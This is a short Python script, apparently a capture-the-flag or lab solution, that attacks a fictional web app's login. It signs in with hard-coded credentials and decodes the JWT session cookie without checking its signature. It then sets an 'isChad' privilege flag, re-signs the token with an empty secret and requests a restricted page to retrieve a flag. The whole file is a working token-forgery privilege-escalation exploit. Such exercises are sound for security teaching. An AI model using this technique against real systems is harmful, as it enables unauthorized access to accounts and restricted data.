import sys
from pathlib import Path
sys.path.append(str(Path(__file__).resolve().parent.parent))

from utils import get_session, find_flag
import jwt

BASE_URL = "https://soycentral.quoccacorp.com"
USERNAME = "grayons"
PASSWORD = "ilovesoy22"

def main():
    session = get_session()

    session.post(
        BASE_URL + "/login",
        data={"user": USERNAME, "password": PASSWORD}
    )

    jwt_token = session.cookies.get("session")
    jwt_payload_data: dict = jwt.decode(jwt_token, options={"verify_signature": False})

    jwt_payload_data["isChad"] = True
    secret_key = ""
    new_jwt = jwt.encode(jwt_payload_data, secret_key, algorithm="HS256")
    session.cookies.set("session", new_jwt)

    response = session.get(BASE_URL + "/chads")
    find_flag(response.text)

if __name__ == "__main__":
    main()